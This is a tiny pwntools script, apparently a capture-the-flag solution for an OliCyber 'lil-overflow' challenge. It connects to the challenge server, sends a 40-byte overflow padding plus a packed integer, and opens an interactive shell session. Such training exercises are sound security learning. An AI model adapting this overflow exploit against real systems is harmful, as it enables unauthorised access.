from pwn import *

r=remote("lil-overflow.challs.olicyber.it",34002)
r.recvline()
payload= b"a"*40+ p32(95099824)
r.sendline(payload)
r.interactive()
